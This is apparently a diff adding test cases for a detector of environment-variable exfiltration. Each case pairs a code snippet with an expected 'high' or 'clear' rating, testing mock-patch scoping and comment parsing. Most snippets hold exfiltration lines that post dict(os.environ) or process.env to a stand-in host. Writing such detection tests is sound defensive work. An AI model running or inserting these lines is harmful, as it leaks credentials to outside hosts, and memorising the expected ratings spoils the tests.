+  "label": "mock_patcher_through_64_functions_outer_rebinding_loses",
+  "text": "p = patch(\"requests.post\")\ndef f0():\n p = other\n def f1():\n  def f2():\n   def f3():\n    def f4():\n     def f5():\n      def f6():\n       def f7():\n        def f8():\n         def f9():\n          def f10():\n           def f11():\n            def f12():\n             def f13():\n              def f14():\n               def f15():\n                def f16():\n                 def f17():\n                  def f18():\n                   def f19():\n                    def f20():\n                     def f21():\n                      def f22():\n                       def f23():\n                        def f24():\n                         def f25():\n                          def f26():\n                           def f27():\n                            def f28():\n                             def f29():\n                              def f30():\n                               def f31():\n                                def f32():\n                                 def f33():\n                                  def f34():\n                                   def f35():\n                                    def f36():\n                                     def f37():\n                                      def f38():\n                                       def f39():\n                                        def f40():\n                                         def f41():\n                                          def f42():\n                                           def f43():\n                                            def f44():\n                                             def f45():\n                                              def f46():\n                                               def f47():\n                                                def f48():\n                                                 def f49():\n                                                  def f50():\n                                                   def f51():\n                                                    def f52():\n                                                     def f53():\n                                                      def f54():\n                                                       def f55():\n                                                        def f56():\n                                                         def f57():\n                                                          def f58():\n                                                           def f59():\n                                                            def f60():\n                                                             def f61():\n                                                              def f62():\n                                                               def f63():\n                                                                p.start()\n                                                                requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_patcher_through_a_class_body",
+  "text": "p = patch(\"requests.post\")\nclass C:\n    def m(self):\n        p.start()\n        requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_patcher_of_a_class_body_is_not_in_its_methods",
+  "text": "class C:\n    p = patch(\"requests.post\")\n    def m(self):\n        p.start()\n        requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_patcher_of_a_finished_function_is_not_outside",
+  "text": "def g():\n    p = patch(\"requests.post\")\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_patcher_of_a_sibling_function_is_not_visible",
+  "text": "def g():\n    p = patch(\"requests.post\")\ndef h():\n    p.start()\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_patcher_in_a_class_body_is_visible_in_it",
+  "text": "class C:\n    p = patch(\"requests.post\")\n    p.start()\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_in_a_list_is_not_the_patch",
+  "text": "p = [patch('requests.post')]\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_in_a_list_is_not_the_patch",
+  "text": "@[patch('requests.post')]\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_patcher_rebound_in_the_function_that_uses_it",
+  "text": "p = patch(\"requests.post\")\ndef f():\n    p = other\n    p.start()\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_patcher_rebound_in_the_function_after_it_started",
+  "text": "p = patch(\"requests.post\")\ndef f():\n    p.start()\n    p = other\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_scope_boundary_rebinding",
+  "text": "p = patch('requests.post')\ndef placeholder(): pass\np = replacement\np.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "unknown_language_comment_after_a_value",
+  "text": "const value = 2 // fetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "unknown_language_comment_after_a_value_then_next_line",
+  "text": "const value = 2 // note\nfetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "unknown_language_hash_comment_after_a_value",
+  "text": "value = 2  # requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "unknown_language_floor_division_then_call",
+  "text": "n = 8 // 2; requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "unknown_language_both_runtimes_comment_after_a_value",
+  "text": "const value = 2 // fetch(destination, {body: process.env})\nconst home = os.environ"
+ },
+ {
+  "expect": "high",
+  "label": "unknown_language_both_runtimes_next_line",
+  "text": "const value = 2 // note\nfetch(destination, {body: process.env})\nconst home = os.environ"
+ },
+ {
+  "expect": "clear",
+  "label": "unknown_language_both_runtimes_floor_division_same_line_is_a_limit",
+  "text": "n = 8 // 2; requests.post(destination, json=dict(os.environ))\nconst x = process.env"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_keyword_used_as_a_name_ends_at_its_semicolon_then_declaration",
+  "text": "x = function; function outer(){}\n / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_keyword_used_as_a_name_ends_at_its_semicolon_then_block",
+  "text": "x = function; {}\n / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_function_body_is_consumed_by_its_own_brace_then_block",
+  "text": "let f = function(){}\n{}\n / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_function_two_keywords_one_body_then_block",
+  "text": "let f = new function(){}\n{}\n / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_in_unclosed_groups_is_not_a_binding",
+  "text": "p = ((patch('requests.post') ;\np.start()\nrequests.post('https://review.example.invalid/check', json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "unknown_language_node_text_is_read_as_node_after_a_visible_env_and_call",
+  "text": "const home = process.env.HOME\nfetch(local)\na = 1 // /*\nfetch(destination, {body: process.env})\n"
+ },
+ {
+  "expect": "clear",
+  "label": "unknown_language_both_runtimes_block_open_in_comment_is_a_limit",
+  "text": "const home = process.env.HOME\nfetch(local)\nx = os.environ\na = 1 // /*\nfetch(destination, {body: process.env})\n"
+ }
+]
